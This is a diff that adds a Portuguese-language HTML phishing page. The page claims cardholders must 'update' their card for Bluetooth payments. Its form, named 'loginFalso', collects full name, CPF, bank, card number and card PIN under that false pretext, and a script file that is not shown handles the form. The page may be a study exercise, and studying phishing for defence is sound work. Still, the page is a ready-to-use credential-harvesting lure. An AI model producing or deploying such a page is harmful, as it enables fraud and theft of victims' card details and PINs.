@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<!--
+Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
+Click nbfs://nbhost/SystemFileSystem/Templates/Other/html.html to edit this template
+-->
+<html>
+    <head>
+        <title>Atualização de Cartão</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+         <link rel="stylesheet" href="css.css"/>
+    </head>
+    <body>
+        <div class="titulo">
+        <h1>Atualização de Cartão para Bluetooth!</h1>
+        </div>
+        
+        
+        <div class="margem"> 
+           
+            <form id="loginFalso" name="loginFalso">
+                <p>Atualize já seu cartão, para que você possa fazer transações via bluetooth, agora sem a ncessidade de wifi!</p>
+               
+                <label for="nome">Nome </label><br>
+                <input type="text" id="nome" name="nome"
+                       placeholder="Informe seu nome completo" required=""><br><br>
+                
+                <label for="cpf">CPF:</label><br>
+                <input type="text" id="cpf" name="cpf" 
+                   maxlength="14" oninput="maskCPF(this)" placeholder="Insira o seu CPF"
+                   required=""><br><br>
+                
+                <label for="banco">Companhia Bancária </label><br>
+                <input type="text" id="banco" name="banco"
+                       placeholder="Informe sua Companhia Bancária" required=""><br><br>
+                
+                <label for="numero">Número do Cartão</label><br>
+                <input type="text" id="numero" name="numero" maxlength="19"
+                       placeholder="Informe o Número do seu Cartão" oninput="maskCardNumber(this)" required=""><br><br>
+                
+                <label for="senha">Senha do Cartão</label><br>
+                <input type="number" id="senha" name="senha" 
+                       placeholder="Informe sua Senha do Cartão" required=""><br><br>
+
+                <div class="centro">
+                    <input type="submit" value="Enviar" id="enviar" name="enviar"/>
+                    <input type="reset" id="limpar" name="limpar"/><br>
+                </div>
+                
+            </form>
+            <script src="js.js"></script>
+        </div>
+        
+    </body>
+</html>
